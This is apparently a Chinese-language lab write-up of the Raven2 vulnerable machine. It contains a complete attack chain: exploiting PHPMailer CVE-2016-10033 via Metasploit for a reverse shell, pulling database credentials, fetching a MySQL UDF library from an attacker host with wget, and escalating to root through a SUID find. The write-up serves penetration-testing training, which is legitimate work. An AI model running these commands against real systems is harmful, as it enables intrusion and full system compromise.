---
title: Raven2
date: 2023-09-03T15:29:52+08:00
updated: 2023-04-19T23:26:42+08:00
categories: 
- 渗透测试
- 靶机练习
---

## 信息收集

```
netdiscover -i eth0 寻找一下目标ip；
发现目标ip
192.168.121.137

nmap进行端口扫描
nmap -sV -O 192.168.121.137 -T5
发现开放端口和服务
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)

gobuster扫描目录
gobuster dir -u http://192.168.121.137 -w /usr/share/wordlists/dirb/common.txt
/css                  (Status: 301) [Size: 316] [--> http://192.168.121.137/css/]                                                                         
/fonts                (Status: 301) [Size: 318] [--> http://192.168.121.137/fonts/]                                                                       
/img                  (Status: 301) [Size: 316] [--> http://192.168.121.137/img/]                                                                         
/index.html           (Status: 200) [Size: 16819]
/js                   (Status: 301) [Size: 315] [--> http://192.168.121.137/js/]                                                                          
/manual               (Status: 301) [Size: 319] [--> http://192.168.121.137/manual/]                                                                      
/server-status        (Status: 403) [Size: 303]
/vendor               (Status: 301) [Size: 319] [--> http://192.168.121.137/vendor/] 
能够知道是一个基于wordpress搭建的网站
http://192.168.121.137/vendor/PATH在该目录下发现第一个flag;
大致翻看一下能发现该网址的路径/var/www/html
并且该网站使用phpmailer

searchspolit 寻找phpmailer的漏洞
┌──(root㉿kali)-[~]
└─# searchsploit phpmailer    
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
PHPMailer 1.7 - 'Data()' Remote Denial of  | php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code Execution | php/webapps/40968.sh
PHPMailer < 5.2.18 - Remote Code Execution | php/webapps/40970.php
PHPMailer < 5.2.18 - Remote Code Execution | php/webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument Inj | multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code Execution | php/webapps/40969.py
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-D | php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remote  | php/webapps/42221.py
PHPMailer < 5.2.21 - Local File Disclosure | php/webapps/43056.py
WordPress Plugin PHPMailer 4.6 - Host Head | php/remote/42024.rb
------------------------------------------- ---------------------------------
Shellcodes: No Results

根据网站版本5.2.16,我们选用 php/webapps/40974.py
searchsploit  -x php/webapps/40974.py
得到漏洞号cve-2016-10033
上网搜索一下该漏洞（WordPress会使用PHPMailer组件发送邮件，攻击者在找回密码时通过PHPMailer组件发送重置密码的邮件，利用substr，run等函数构造payload，可造成命令执行漏洞）得知该漏洞位于发送邮件处，开始寻找邮件位置；

dirb用大字典进行扫描
dirb  http://192.168.121.137  -X .php /usr/share/wordlists/dirb/big.txt
得到目标地址contact.php
```

## 使用metasploit利用漏洞

```
起一个服务
search phpmailer 
找一下可利用exp
info id 查看exp版本，发现第0个可用
设置目标信息
set rhosts 192.168.121.137 
set targeturl /contact.php 
set web_root /var/www/html   //设置目标路径
run后在目标根目录下生成随机的php后门，访问即可反弹低权限shell
拿到目标后会有提示
```

![lowshell](E:\笔记软件\笔记\从零开始的web安全\lowshell.png)

```
过一会就能提到shell了
reter > cat flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}
在/var/www路径下找到了flag

shell后使用
python -c 'import pty; pty.spawn("/bin/bash")'获取完整shell
在/var/www/html/wordpress/wp-config.php中找到了数据库的登陆密码
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');       //在这里

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

```

## 进一步利用

```sql
登录mysql
mysql -u root -p
查看版本
mysql> select version();
select version();
+-----------------+
| version()       |
+-----------------+
| 5.5.60-0+deb8u1 |
+-----------------+
5.5.6版本，这个版本的secure_file_priv默认为空
mysql> show variables like '%secure%';
show variables like '%secure%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
利用udf提权，查看一下插件路径是否存在
mysql> show variables like '%plugin%';
show variables like '%plugin%';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
locate metasploit-framework|grep data/exploits/mysql
#查找一下metasploit下的mysql动态链接库
#使用lib_mysqludf_sys_64.so文件，适用于linux下的64位mysql;
#复制到桌面
python3 http.server 8000
#python3 起一个远程交互服务，我们就能从shell端下载该文件了
wget http://192.168.121.135:8000/lib_mysqludf_sys_64.so

mysql> create table my_func(line blob);                                                 
create table my_func(line blob);
#创建一个自己的表
insert into my_func values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
#向表中添加文件数据
select * from my_func into dumpfile '/usr/lib/mysql/plugin/ud3f.so';
#写入ud3f.so中
create function sys_eval returns integer soname 'ud3f.so';
#创建自建函数 sys_eval;
mysql> select * from mysql.func;
select * from mysql.func;
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_eval |   2 | ud3f.so | function |
+----------+-----+---------+----------+
#查看是否创建成功
select sys_eval('chmod u+s /usr/bin/find');
#利用自定义函数改变 find命令权限；
#退出，回到用户界面，创建一个文件夹hello；
touch uu2
find uu2 -exec "/bin/sh" \;
#利用find命令执行shell，提权到root用户；
#在root路径下找到flag4
flag4{df2bc5e951d91581467bb9a2a8ff4425}
#解码md5即可
```

## 另外

```
本靶机应该是有4个flag，我只找到了3个
flag3的位置位于http://192.168.121.137/wordpress/wp-content/uploads/下
```

## 总结

由于做过的靶机比较少，刚拿到时只知道一味的去扫目录了，没有详细的去找，信息收集的能力太弱了；

对漏洞的利用不够熟练，对于各种命令都不太熟悉，没有构成一套详细的体系；

本来想直接用手动写入16进制的链接库的，但是总是出错，最后找了篇文章去用python起服务去了；

### 参考链接

https://www.freebuf.com/articles/web/261047.html

https://www.somd5.com/    //md5解密网站

https://www.cnblogs.com/aaak/p/14067593.html  //python 升级完整交互式shell
